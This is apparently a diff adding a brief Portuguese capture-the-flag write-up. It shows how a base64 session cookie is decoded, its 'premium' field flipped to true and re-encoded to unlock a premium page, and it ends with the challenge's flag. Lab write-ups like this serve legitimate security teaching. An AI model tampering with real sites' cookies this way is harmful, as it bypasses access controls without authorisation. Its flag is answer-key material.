@@ -1,0 +1,14 @@
+O site pede para cadastrar e realizar login. Dentro da pagina do usuario há
+uma opção de All Tools. Ao clicar, tenho a mensagem que é somente para Premium.
+
+Pego o cookie da sessao: eyJpZCI6ODAsInVzZXJuYW1lIjoiY3RqMTciLCJhdXRoIjp0cnVlLCJwcmVtaXVtIjpmYWxzZX0%3D
+
+Base64 para: {"id":80,"username":"ctj17","auth":true,"premium":false}
+
+troco "premium":false para "premium":true e gero outro Base64: eyJpZCI6ODAsInVzZXJuYW1lIjoiY3RqMTciLCJhdXRoIjp0cnVlLCJwcmVtaXVtIjp0cnVlfQ%3D%3D
+
+Ao clicar em All Tools tenho a flag.
+
+ALQ{E4sy_T0k3n_M4n1pul4t10n}
+
+
